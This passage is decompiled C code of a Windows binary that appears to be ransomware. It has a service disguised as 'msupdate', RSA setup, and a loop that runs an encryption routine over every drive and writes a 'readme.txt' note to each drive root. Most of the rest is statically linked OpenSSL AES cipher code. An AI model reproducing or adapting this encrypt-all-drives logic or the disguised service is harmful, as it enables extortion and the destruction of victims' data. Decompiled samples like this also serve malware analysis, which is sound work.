        if ( GetLogicalDriveStringsA(0xFFu, Buffer) )
        {
          do
          {
            v13 = Buffer[v0];
            if ( v13 >= 67 && v13 <= 90 || v13 >= 99 && v13 <= 122 )
            {
              sprintf(Buffer, "%c:\\", v13);
              if ( GetDriveTypeA(Buffer) != 5 )
              {
                if ( GetDriveTypeA(Buffer) )
                {
                  sub_401640((int)v12, Buffer, 1, v19, v17, Block);
                  sprintf(byte_73A8F0, "%c:\\%s", Buffer[v0], "readme.txt");
                  v14 = fopen(byte_73A8F0, "w+");
                  if ( v14 )
                  {
                    fwrite(::Buffer, 1u, strlen(::Buffer), v14);
                    fclose(v14);
                  }
                }
              }
            }
            ++v0;
          }
          while ( v0 < 255 );
        }
      }
      sub_405630(v12);
    }
    else
    {
      printf("create rsa error\n");
    }
    free(Block);
    free(v17);
  }
  if ( ::Block )
    free(::Block);
  ServiceStatus.dwCurrentState = 1;
  ServiceStatus.dwWin32ExitCode = 0;
  ServiceStatus.dwWaitHint = 0;
  ServiceStatus.dwControlsAccepted = 1;
  ServiceStatus.dwCheckPoint = 0;
  SetServiceStatus(hServiceStatus, &ServiceStatus);
  return sub_401C80();
}

//----- (00402040) --------------------------------------------------------
int __stdcall sub_402040(int a1)
{
  int result; // eax

  if ( a1 == 1 )
  {
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwWaitHint = 0;
    ServiceStatus.dwCheckPoint = dword_5373A8++;
    ServiceStatus.dwCurrentState = 3;
    ServiceStatus.dwControlsAccepted = 1;
    SetServiceStatus(hServiceStatus, &ServiceStatus);
    sub_401C10(ServiceStatus.dwCurrentState, 0);
    return WSACleanup();
  }
  else
  {
    result = a1 - 5;
    if ( a1 == 5 )
      ServiceStatus.dwCurrentState = 1;
  }
  return result;
}
// 5373A8: using guessed type int dword_5373A8;

//----- (00402130) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  SERVICE_TABLE_ENTRYA ServiceStartTable; // [esp+0h] [ebp-10h] BYREF
  int v5; // [esp+8h] [ebp-8h]
  int v6; // [esp+Ch] [ebp-4h]

  v5 = 0;
  v6 = 0;
  ServiceStartTable.lpServiceName = (LPSTR)"msupdate";
  ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_4020B0;
  StartServiceCtrlDispatcherA(&ServiceStartTable);
  sub_401D10();
  return 0;
}
// 4020B0: using guessed type int __stdcall sub_4020B0(int, int);

//----- (00402170) --------------------------------------------------------
int __usercall sub_402170@<eax>(__m128 a1@<xmm5>, int a2, int a3, int a4, int a5)
{
  __m128i *v5; // edi
  FILE *v6; // eax
  int v7; // esi
  int v8; // eax
  int v9; // eax
  void (__cdecl *v10)(__m128 *, __m128 *, unsigned int, __int128); // ecx
  int v11; // eax

  v5 = (__m128i *)sub_4073F0(a2);
  v6 = (FILE *)sub_435D30(a2);
  v7 = _fileno(v6) & 0xF0007;
  if ( (v7 == 1 || v7 == 2) && !a5 )
  {
    v8 = sub_407470(a2);
    v9 = sub_40B820(a1, a3, 8 * v8, v5);
    v5[15].m128i_i32[2] = (__int32)sub_4087D0;
    v10 = v7 != 2 ? 0 : (void (__cdecl *)(__m128 *, __m128 *, unsigned int, __int128))sub_40AF30;
  }
  else
  {
    v11 = sub_407470(a2);
    v9 = sub_40B800(a1, a3, 8 * v11, v5);
    v5[15].m128i_i32[2] = (__int32)sub_408780;
    if ( v7 == 2 )
    {
      v5[15].m128i_i32[3] = (__int32)sub_40AF30;
      goto LABEL_9;
    }
    v10 = v7 != 5 ? 0 : sub_409310;
  }
  v5[15].m128i_i32[3] = (__int32)v10;
LABEL_9:
  if ( v9 >= 0 )
    return 1;
  sub_408310(6, 165, 143, (int)"crypto\\evp\\e_aes.c", 277);
  return 0;
}

//----- (00402260) --------------------------------------------------------
int __cdecl sub_402260(int C, __m128 *a2, const __m128i *a3, int a4)
{
  int v4; // eax
  __m128 *v6; // [esp-8h] [ebp-Ch]
  int v7; // [esp-4h] [ebp-8h]

  v7 = sub_432B60(C);
  v6 = (__m128 *)_tolower(C);
  v4 = sub_4073F0(C);
  sub_40AF30(a3, a2, a4, v4, v6, v7);
  return 1;
}

//----- (004022B0) --------------------------------------------------------
int __cdecl sub_4022B0(int a1, __m128 *a2, const __m128i *a3, unsigned int a4)
{
  int v4; // eax
  int v6; // [esp-4h] [ebp-Ch]

  if ( a4 >= sub_4073D0(a1) )
  {
    v6 = sub_432B60(a1);
    v4 = sub_4073F0(a1);
    sub_408CC0(a3, a2, a4, v4, v6);
  }
  return 1;
}

//----- (00402300) --------------------------------------------------------
int __usercall sub_402300@<eax>(__m128 a1@<xmm5>, int a2, int a3, _DWORD *Src)
{
  int v4; // eax
  _DWORD *v5; // edi
  __m128i *v6; // esi
  int v8; // eax
  __m128i *v9; // [esp-4h] [ebp-14h]

  v4 = sub_4073F0(a2);
  v5 = Src;
  v6 = (__m128i *)v4;
  if ( Src )
  {
    if ( !a3 )
    {
      if ( *(_DWORD *)(v4 + 248) )
        sub_40BD70(v4 + 256, Src, *(_DWORD *)(v4 + 636));
      else
        memcpy(*(void **)(v4 + 632), Src, *(_DWORD *)(v4 + 636));
      v6[15].m128i_i32[3] = 1;
      v6[40].m128i_i32[1] = 0;
      return 1;
    }
  }
  else if ( !a3 )
  {
    return 1;
  }
  v9 = (__m128i *)v4;
  v8 = sub_407470(a2);
  sub_40B800(a1, a3, 8 * v8, v9);
  sub_40BC80(v6 + 16, (int)v6, (void (__cdecl *)(__m128i *, __m128i *, int))sub_408780);
  v6[40].m128i_i32[3] = (__int32)sub_409310;
  if ( Src || v6[15].m128i_i32[3] && (v5 = (_DWORD *)v6[39].m128i_i32[2]) != 0 )
  {
    sub_40BD70((int)v6[16].m128i_i32, v5, v6[39].m128i_u32[3]);
    v6[15].m128i_i32[3] = 1;
  }
  v6[15].m128i_i32[2] = 1;
  return 1;
}

//----- (00402400) --------------------------------------------------------
int __usercall sub_402400@<eax>(__m128 a1@<xmm5>, int C, int a3, _DWORD *a4, int a5)
{
  int v5; // eax
  int v6; // esi
  int v8; // eax
  _DWORD *v9; // eax
  int v10; // [esp-8h] [ebp-18h]
  int v11; // [esp-8h] [ebp-18h]
  __m128i *v12; // [esp-4h] [ebp-14h]

  v5 = sub_4073F0(C);
  v6 = v5;
  if ( !a4 )
  {
    if ( !a3 )
      return 1;
    goto LABEL_5;
  }
  if ( a3 )
  {
LABEL_5:
    v12 = (__m128i *)v5;
    v10 = 4 * sub_407470(C);
    if ( a5 )
    {
      sub_40B800(a1, a3, v10, v12);
      *(_DWORD *)(v6 + 504) = sub_408780;
      *(_DWORD *)(v6 + 512) = sub_4096B0;
    }
    else
    {
      sub_40B820(a1, a3, v10, v12);
      *(_DWORD *)(v6 + 504) = sub_4087D0;
      *(_DWORD *)(v6 + 512) = sub_409C40;
    }
    v11 = 4 * sub_407470(C);
    v8 = sub_407470(C);
    sub_40B800(a1, a3 + v8 / 2, v11, (__m128i *)(v6 + 248));
    *(_DWORD *)(v6 + 508) = sub_408780;
    *(_DWORD *)(v6 + 496) = v6;
  }
  if ( a4 )
  {
    *(_DWORD *)(v6 + 500) = v6 + 248;
    v9 = (_DWORD *)_tolower(C);
    *v9 = *a4;
    v9[1] = a4[1];
    v9[2] = a4[2];
    v9[3] = a4[3];
  }
  return 1;
}

//----- (00402500) --------------------------------------------------------
int __usercall sub_402500@<eax>(__m128 a1@<xmm5>, int C, int a3, void *Src, int a5)
{
  int v5; // eax
  _DWORD *v6; // esi
  int v8; // eax
  __int64 (__usercall *v9)@<xmm0>(__m128 *, __m128 *, int, __int128); // eax
  void *v10; // eax
  __m128i *v11; // [esp-4h] [ebp-14h]
  size_t v12; // [esp-4h] [ebp-14h]

  v5 = sub_4073F0(C);
  v6 = (_DWORD *)v5;
  if ( !Src )
  {
    if ( !a3 )
      return 1;
    goto LABEL_5;
  }
  if ( a3 )
  {
LABEL_5:
    v11 = (__m128i *)v5;
    v8 = sub_407470(C);
    sub_40B800(a1, a3, 8 * v8, v11);
    sub_40C9B0(v6 + 70, v6[67], v6[66], (int)v6, (int)sub_408780);
    v9 = sub_409030;
    if ( !a5 )
      v9 = sub_409160;
    v6[82] = v9;
    v6[62] = 1;
  }
  if ( Src )
  {
    v12 = 15 - v6[66];
    v10 = (void *)_tolower(C);
    memcpy(v10, Src, v12);
    v6[63] = 1;
  }
  return 1;
}

//----- (004025D0) --------------------------------------------------------
int __usercall sub_4025D0@<eax>(__m128 a1@<xmm5>, int a2, int a3, void *Src, int a5)
{
  int v5; // eax
  void *v6; // ebp
  int v7; // esi
  int v9; // eax
  int v10; // eax
  unsigned int (__cdecl *v11)(const __m128i *, __m128 *, int, int, unsigned int, const __m128i *, const __m128i *, const __m128i *); // eax
  __m128i *v12; // [esp-4h] [ebp-14h]

  v5 = sub_4073F0(a2);
  v6 = Src;
  v7 = v5;
  if ( Src )
  {
    if ( !a3 )
    {
      if ( *(_DWORD *)(v5 + 496) )
        sub_40D7D0(v5 + 504, Src, *(_DWORD *)(v5 + 732), *(_DWORD *)(v5 + 736));
      else
        memcpy(*(void **)(v5 + 672), Src, *(_DWORD *)(v5 + 732));
      *(_DWORD *)(v7 + 500) = 1;
      return 1;
    }
  }
  else if ( !a3 )
  {
    return 1;
  }
  v12 = (__m128i *)v5;
  v9 = sub_407470(a2);
  sub_40B800(a1, a3, 8 * v9, v12);
  v10 = sub_407470(a2);
  sub_40B820(a1, a3, 8 * v10, (__m128i *)(v7 + 248));
  v11 = sub_40A230;
  if ( !a5 )
    v11 = sub_40A8B0;
  if ( !sub_40D5F0(
          (int *)(v7 + 504),
          v7,
          v7 + 248,
          (void (__cdecl *)(int *, int *, int))sub_408780,
          (int)sub_4087D0,
          (int)v11) )
    return 0;
  if ( Src || *(_DWORD *)(v7 + 500) && (v6 = *(void **)(v7 + 672)) != 0 )
  {
    if ( sub_40D7D0(v7 + 504, v6, *(_DWORD *)(v7 + 732), *(_DWORD *)(v7 + 736)) != 1 )
      return 0;
    *(_DWORD *)(v7 + 500) = 1;
  }
  *(_DWORD *)(v7 + 496) = 1;
  return 1;
}

//----- (00402730) --------------------------------------------------------
#error "4027F6: call analysis failed (funcsize=106)"

//----- (00402890) --------------------------------------------------------
int __cdecl sub_402890(int C, char *a2, char *a3, int a4)
{
  int v4; // esi
  int v5; // eax
  _DWORD *v7; // eax
  char *v8; // eax
  int v9; // [esp-4h] [ebp-Ch]
  void (__cdecl *v10)(char *, char *, int); // [esp-4h] [ebp-Ch]
  void (__cdecl *v11)(char *, int *, int); // [esp-4h] [ebp-Ch]

  v4 = sub_4073F0(C);
  if ( *(_DWORD *)(v4 + 252) )
  {
    v9 = sub_432B60(C);
    v5 = _tolower(C);
    (*(void (__cdecl **)(char *, char *, int, int, int, int))(v4 + 252))(a3, a2, a4, v4, v5, v9);
    return 1;
  }
  else
  {
    if ( sub_432B60(C) )
    {
      v10 = *(void (__cdecl **)(char *, char *, int))(v4 + 248);
      v7 = (_DWORD *)_tolower(C);
      sub_4126B0(a3, a2, a4, v4, v7, v10);
    }
    else
    {
      v11 = *(void (__cdecl **)(char *, int *, int))(v4 + 248);
      v8 = (char *)_tolower(C);
      sub_412850(a3, a2, a4, v4, v8, v11);
    }
    return 1;
  }
}

//----- (00402950) --------------------------------------------------------
int __cdecl sub_402950(int a1, int a2, int a3, unsigned int a4)
{
  unsigned int v4; // edi
  int v5; // ebp
  int v6; // esi
  unsigned int v7; // ebx
  int i; // eax
  unsigned int v10; // [esp+20h] [ebp+10h]

  v4 = sub_4073D0(a1);
  v5 = sub_4073F0(a1);
  if ( a4 >= v4 )
  {
    v6 = a3;
    v10 = a4 - v4;
    v7 = 0;
    for ( i = a2 - a3; ; i = a2 - a3 )
    {
      (*(void (__cdecl **)(int, int, int))(v5 + 248))(v6, v6 + i, v5);
      v7 += v4;
      v6 += v4;
      if ( v7 > v10 )
        break;
    }
  }
  return 1;
}

//----- (004029C0) --------------------------------------------------------
int __cdecl sub_4029C0(int C, _BYTE *a2, _BYTE *a3, int a4)
{
  int v4; // edi
  int v5; // eax
  int (__cdecl *v7)(int, int, int); // [esp-4h] [ebp-10h]
  int v8; // [esp+8h] [ebp-4h] BYREF

  v4 = sub_4073F0(C);
  v8 = sub_407450(C);
  v7 = *(int (__cdecl **)(int, int, int))(v4 + 248);
  v5 = _tolower(C);
  sub_412AF0(a3, a2, a4, v4, v5, (unsigned int *)&v8, v7);
  sub_407460(C, v8);
  return 1;
}

//----- (00402A30) --------------------------------------------------------
int __cdecl sub_402A30(int C, _BYTE *a2, _BYTE *a3, int a4)
{
  int v4; // edi
  int v5; // eax
  int v7; // [esp-8h] [ebp-14h]
  void (__cdecl *v8)(int, int, int); // [esp-4h] [ebp-10h]
  int v9; // [esp+8h] [ebp-4h] BYREF

  v4 = sub_4073F0(C);
  v9 = sub_407450(C);
  v8 = *(void (__cdecl **)(int, int, int))(v4 + 248);
  v7 = sub_432B60(C);
  v5 = _tolower(C);
  sub_412C00(a3, a2, a4, v4, v5, (unsigned int *)&v9, v7, v8);
  sub_407460(C, v9);
  return 1;
}

//----- (00402AB0) --------------------------------------------------------
int __cdecl sub_402AB0(int C, int a2, _BYTE *a3, int a4)
{
  int v4; // edi
  int *v5; // eax
  int v7; // [esp-8h] [ebp-14h]
  void (__cdecl *v8)(int *, int *, int); // [esp-4h] [ebp-10h]
  int v9; // [esp+8h] [ebp-4h] BYREF

  v4 = sub_4073F0(C);
  v9 = sub_407450(C);
  v8 = *(void (__cdecl **)(int *, int *, int))(v4 + 248);
  v7 = sub_432B60(C);
  v5 = (int *)_tolower(C);
  sub_4130A0(a3, a2, a4, v4, v5, (int)&v9, v7, v8);
  sub_407460(C, v9);
  return 1;
}

//----- (00402B30) --------------------------------------------------------
int __cdecl sub_402B30(int C, int a2, int a3, unsigned int a4)
{
  int v4; // edi
  int *v5; // eax
  unsigned int v7; // ebx
  unsigned int v8; // ebp
  int *v9; // eax
  int v10; // eax
  int *v11; // eax
  int v12; // [esp-10h] [ebp-1Ch]
  void (__cdecl *v13)(int *, int *, int); // [esp-Ch] [ebp-18h]
  int v14; // [esp-Ch] [ebp-18h]
  int v15; // [esp-8h] [ebp-14h]
  void (__cdecl *v16)(int *, int *, int); // [esp-8h] [ebp-14h]
  void (__cdecl *v17)(int *, int *, int); // [esp-4h] [ebp-10h]
  int v18; // [esp+8h] [ebp-4h] BYREF

  v4 = sub_4073F0(C);
  if ( sub_4075D0(C, 0x2000) )
  {
    v18 = sub_407450(C);
    v17 = *(void (__cdecl **)(int *, int *, int))(v4 + 248);
    v15 = sub_432B60(C);
    v5 = (int *)_tolower(C);
    sub_413000(a3, a2, a4, v4, v5, (int)&v18, v15, v17);
    sub_407460(C, v18);
    return 1;
  }
  else
  {
    v7 = a4;
    if ( a4 >= 0x10000000 )
    {
      v8 = a4 >> 28;
      do
      {
        v18 = sub_407450(C);
        v13 = *(void (__cdecl **)(int *, int *, int))(v4 + 248);
        v12 = sub_432B60(C);
        v9 = (int *)_tolower(C);
        sub_413000(a3, a2, 0x80000000, v4, v9, (int)&v18, v12, v13);
        sub_407460(C, v18);
        v7 -= 0x10000000;
        --v8;
      }
      while ( v8 );
    }
    if ( v7 )
    {
      v10 = sub_407450(C);
      v16 = *(void (__cdecl **)(int *, int *, int))(v4 + 248);
      v18 = v10;
      v14 = sub_432B60(C);
      v11 = (int *)_tolower(C);
      sub_413000(a3, a2, 8 * v7, v4, v11, (int)&v18, v14, v16);
      sub_407460(C, v18);
    }
    return 1;
  }
}

//----- (00402C90) --------------------------------------------------------
int __cdecl sub_402C90(int C, _BYTE *a2, _BYTE *a3, int a4)
{
  int v4; // edi
  int v5; // eax
  int v6; // eax
  _DWORD *v8; // [esp-Ch] [ebp-18h]
  _DWORD *v9; // [esp-Ch] [ebp-18h]
  void (__cdecl *v10)(_DWORD *, _DWORD *, unsigned int, int, int); // [esp-4h] [ebp-10h]
  void (__cdecl *v11)(int, _DWORD *, int); // [esp-4h] [ebp-10h]
  int v12; // [esp+8h] [ebp-4h] BYREF

  v12 = sub_407450(C);
  v4 = sub_4073F0(C);
  if ( *(_DWORD *)(v4 + 252) )
  {
    v10 = *(void (__cdecl **)(_DWORD *, _DWORD *, unsigned int, int, int))(v4 + 252);
    v8 = (_DWORD *)sub_407440(C);
    v5 = _tolower(C);
    sub_413270(a3, a2, a4, v4, v5, v8, &v12, v10);
  }
  else
  {
    v11 = *(void (__cdecl **)(int, _DWORD *, int))(v4 + 248);
    v9 = (_DWORD *)sub_407440(C);
    v6 = _tolower(C);
    sub_413120(a3, a2, a4, v4, v6, v9, &v12, v11);
  }
  sub_407460(C, v12);
  return 1;
}

//----- (00402D40) --------------------------------------------------------
void *sub_402D40()
{
  void *result; // eax

  result = &unk_4F02AC;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F02E0;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402D60) --------------------------------------------------------
void *sub_402D60()
{
  void *result; // eax

  result = &unk_4F0314;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0348;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402D80) --------------------------------------------------------
void *sub_402D80()
{
  void *result; // eax

  result = &unk_4F037C;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F03B0;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402DA0) --------------------------------------------------------
void *sub_402DA0()
{
  void *result; // eax

  result = &unk_4F03E4;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0418;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402DC0) --------------------------------------------------------
void *sub_402DC0()
{
  void *result; // eax

  result = &unk_4F044C;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0480;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402DE0) --------------------------------------------------------
void *sub_402DE0()
{
  void *result; // eax

  result = &unk_4F04B4;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F04E8;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402E00) --------------------------------------------------------
void *sub_402E00()
{
  void *result; // eax

  result = &unk_4F051C;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0550;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402E20) --------------------------------------------------------
void *sub_402E20()
{
  void *result; // eax

  result = &unk_4F0584;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F05B8;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402E40) --------------------------------------------------------
void *sub_402E40()
{
  void *result; // eax

  result = &unk_4F05EC;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0620;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402E60) --------------------------------------------------------
void *sub_402E60()
{
  void *result; // eax

  result = &unk_4F0654;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0688;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402E80) --------------------------------------------------------
void *sub_402E80()
{
  void *result; // eax

  result = &unk_4F06BC;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F06F0;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402EA0) --------------------------------------------------------
void *sub_402EA0()
{
  void *result; // eax

  result = &unk_4F0724;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0758;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402EC0) --------------------------------------------------------
void *sub_402EC0()
{
  void *result; // eax

  result = &unk_4F078C;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F07C0;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402EE0) --------------------------------------------------------
void *sub_402EE0()
{
  void *result; // eax

  result = &unk_4F07F4;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0828;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402F00) --------------------------------------------------------
void *sub_402F00()
{
  void *result; // eax

  result = &unk_4F085C;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0890;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402F20) --------------------------------------------------------
void *sub_402F20()
{
  void *result; // eax

  result = &unk_4F08C4;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F08F8;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402F40) --------------------------------------------------------
void *sub_402F40()
{
  void *result; // eax

  result = &unk_4F092C;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0960;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402F60) --------------------------------------------------------
void *sub_402F60()
{
  void *result; // eax

  result = &unk_4F0994;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F09C8;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402F80) --------------------------------------------------------
void *sub_402F80()
{
  void *result; // eax

  result = &unk_4F09FC;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0A30;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402FA0) --------------------------------------------------------
void *sub_402FA0()
{
  void *result; // eax

  result = &unk_4F0A64;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0A98;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402FC0) --------------------------------------------------------
void *sub_402FC0()
{
  void *result; // eax

  result = &unk_4F0ACC;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0B00;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00402FE0) --------------------------------------------------------
int __cdecl sub_402FE0(int C)
{
  int v1; // esi
  void *v2; // esi

  v1 = sub_4073F0(C);
  sub_4139E0((_BYTE *)(v1 + 256), 0x178u);
  v2 = *(void **)(v1 + 632);
  if ( v2 != (void *)_tolower(C) )
    sub_413490(v2);
  return 1;
}

//----- (00403030) --------------------------------------------------------
int __cdecl sub_403030(int C, int a2, int Size, _DWORD *Src)
{
  int v4; // esi
  void *v6; // ebx
  void *v7; // eax
  void *v8; // eax
  const void *v9; // eax
  size_t v10; // eax
  signed int v11; // ecx
  int v12; // edx
  int v13; // eax
  char v14; // cl
  int v15; // eax
  int v16; // ebx
  int v17; // esi
  int v18; // ebx
  int v19; // eax
  void *v20; // eax
  char v21; // [esp+18h] [ebp+8h]

  v4 = sub_4073F0(C);
  switch ( a2 )
  {
    case 0:
      *(_DWORD *)(v4 + 248) = 0;
      *(_DWORD *)(v4 + 252) = 0;
      *(_DWORD *)(v4 + 636) = sub_407410(C);
      *(_DWORD *)(v4 + 632) = _tolower(C);
      *(_DWORD *)(v4 + 640) = -1;
      *(_DWORD *)(v4 + 644) = 0;
      *(_DWORD *)(v4 + 648) = -1;
      return 1;
    case 8:
      v18 = sub_4073F0((int)Src);
      v19 = *(_DWORD *)(v4 + 628);
      if ( v19 )
      {
        if ( v19 != v4 )
          return 0;
        *(_DWORD *)(v18 + 628) = v18;
      }
      if ( *(_DWORD *)(v4 + 632) == _tolower(C) )
      {
        *(_DWORD *)(v18 + 632) = _tolower((int)Src);
        return 1;
      }
      else
      {
        v20 = sub_4133F0(*(_DWORD *)(v4 + 636));
        *(_DWORD *)(v18 + 632) = v20;
        if ( !v20 )
          return 0;
        memcpy(v20, *(const void **)(v4 + 632), *(_DWORD *)(v4 + 636));
        return 1;
      }
    case 9:
      if ( Size <= 0 )
        return 0;
      if ( Size > 16 && Size > *(_DWORD *)(v4 + 636) )
      {
        v6 = *(void **)(v4 + 632);
        if ( v6 != (void *)_tolower(C) )
          sub_413490(v6);
        v7 = sub_4133F0(Size);
        *(_DWORD *)(v4 + 632) = v7;
        if ( !v7 )
          return 0;
      }
      *(_DWORD *)(v4 + 636) = Size;
      return 1;
    case 16:
      if ( (unsigned int)(Size - 1) > 0xF || !sub_432B60(C) || *(int *)(v4 + 640) < 0 )
        return 0;
      v9 = (const void *)sub_407440(C);
      memcpy(Src, v9, Size);
      return 1;
    case 17:
      if ( (unsigned int)(Size - 1) > 0xF || sub_432B60(C) )
        return 0;
      v8 = (void *)sub_407440(C);
      memcpy(v8, Src, Size);
      *(_DWORD *)(v4 + 640) = Size;
      return 1;
    case 18:
      if ( Size == -1 )
      {
        memcpy(*(void **)(v4 + 632), Src, *(_DWORD *)(v4 + 636));
LABEL_20:
        *(_DWORD *)(v4 + 644) = 1;
        return 1;
      }
      if ( Size < 4 || *(_DWORD *)(v4 + 636) - Size < 8 )
        return 0;
      memcpy(*(void **)(v4 + 632), Src, Size);
      if ( !sub_432B60(C) || sub_406FF0() > 0 )
        goto LABEL_20;
      return 0;
    case 19:
      if ( !*(_DWORD *)(v4 + 644) || !*(_DWORD *)(v4 + 248) )
        return 0;
      sub_40BD70(v4 + 256, *(_DWORD **)(v4 + 632), *(_DWORD *)(v4 + 636));
      v10 = Size;
      if ( Size <= 0 || (v11 = *(_DWORD *)(v4 + 636), Size > v11) )
      {
        v11 = *(_DWORD *)(v4 + 636);
        v10 = v11;
      }
      memcpy(Src, (const void *)(v11 + *(_DWORD *)(v4 + 632) - v10), v10);
      v12 = *(_DWORD *)(v4 + 632) + *(_DWORD *)(v4 + 636) - 8;
      v13 = 8;
      do
      {
        v14 = *(_BYTE *)(v13 + v12 - 1);
        *(_BYTE *)(--v13 + v12) = v14 + 1;
      }
      while ( v14 == -1 && v13 );
      *(_DWORD *)(v4 + 252) = 1;
      return 1;
    case 22:
      if ( Size != 13 )
        return 0;
      v15 = sub_407440(C);
      *(_DWORD *)v15 = *Src;
      *(_DWORD *)(v15 + 4) = Src[1];
      *(_DWORD *)(v15 + 8) = Src[2];
      *(_BYTE *)(v15 + 12) = *((_BYTE *)Src + 12);
      *(_DWORD *)(v4 + 648) = 13;
      v16 = *(unsigned __int8 *)(sub_407440(C) + 11) << 8;
      v17 = (v16 | *(unsigned __int8 *)(sub_407440(C) + 12)) - 8;
      v21 = v17;
      if ( !sub_432B60(C) )
      {
        LOWORD(v17) = v17 - 16;
        v21 = v17;
      }
      *(_BYTE *)(sub_407440(C) + 11) = BYTE1(v17);
      *(_BYTE *)(sub_407440(C) + 12) = v21;
      return 16;
    case 24:
      if ( !*(_DWORD *)(v4 + 644) || !*(_DWORD *)(v4 + 248) || sub_432B60(C) )
        return 0;
      memcpy((void *)(*(_DWORD *)(v4 + 636) + *(_DWORD *)(v4 + 632) - Size), Src, Size);
      sub_40BD70(v4 + 256, *(_DWORD **)(v4 + 632), *(_DWORD *)(v4 + 636));
      *(_DWORD *)(v4 + 252) = 1;
      return 1;
    default:
      return -1;
  }
}
// 4031F8: conditional instruction was optimized away because %Size.4>=4

//----- (004034E0) --------------------------------------------------------
#error "403531: call analysis failed (funcsize=99)"

//----- (00403610) --------------------------------------------------------
int __fastcall sub_403610(unsigned int a1, int a2, int a3, int a4)
{
  int result; // eax
  int v8; // eax
  _BYTE *v9; // eax
  char *v10; // ebp
  _BYTE *v11; // edi
  unsigned int v12; // esi
  int v13; // ebx
  int v14; // eax
  int v15; // eax
  void *v16; // eax
  char *v17; // eax
  unsigned int v18; // [esp-4h] [ebp-18h]
  int v19; // [esp+10h] [ebp-4h]
  int v20; // [esp+1Ch] [ebp+8h]

  v20 = sub_4073F0(a3);
  result = -1;
  v19 = -1;
  if ( a2 == a4 && a1 >= 0x18 )
  {
    v8 = sub_432B60(a3);
    if ( sub_406090(a3, v8 != 0 ? 19 : 24, 8, a2) > 0 )
    {
      v18 = *(_DWORD *)(v20 + 648);
      v9 = (_BYTE *)sub_407440(a3);
      if ( !sub_40BEE0(v20 + 256, v9, v18) )
      {
        v10 = (char *)(a4 + 8);
        v11 = (_BYTE *)(a2 + 8);
        v12 = a1 - 24;
        if ( sub_432B60(a3) )
        {
          v13 = v20;
          if ( *(_DWORD *)(v20 + 652) )
            v14 = sub_40C4A0(v20 + 256, v10, v11, v12, *(void (__cdecl **)(_BYTE *, _BYTE *, int, int, int))(v20 + 652));
          else
            v14 = sub_40BFD0(v20 + 256, (int)v10, v11, v12);
          if ( !v14 )
          {
            sub_40C970(v20 + 256, &v11[v12], 0x10u);
            v19 = v12 + 24;
          }
          goto LABEL_19;
        }
        if ( *(_DWORD *)(v20 + 652) )
          v15 = sub_40C6A0(v20 + 256, v10, v11, v12, *(void (__cdecl **)(char *, _BYTE *, int, int, int))(v20 + 652));
        else
          v15 = sub_40C240(v20 + 256, v10, v11, v12);
        if ( !v15 )
        {
          v16 = (void *)sub_407440(a3);
          sub_40C970(v20 + 256, v16, 0x10u);
          v17 = (char *)sub_407440(a3);
          if ( sub_413A50(v17, &v10[v12], 16) )
            sub_4139E0(v11, v12);
          else
            v19 = v12;
        }
      }
    }
    v13 = v20;
LABEL_19:
    result = v19;
    *(_DWORD *)(v13 + 252) = 0;
    *(_DWORD *)(v13 + 648) = -1;
  }
  return result;
}

//----- (004037C0) --------------------------------------------------------
int __cdecl sub_4037C0(int a1, _BYTE *a2, char *a3, unsigned int a4)
{
  _DWORD *v4; // eax
  _DWORD *v5; // esi
  unsigned int v7; // edi
  int v8; // eax
  bool v9; // zf
  void (__cdecl *v10)(char *, _BYTE *, int, int, int); // eax
  int v11; // esi
  int v12; // esi
  _BYTE *v13; // eax
  void *v14; // eax
  unsigned int v15; // [esp-8h] [ebp-10h]

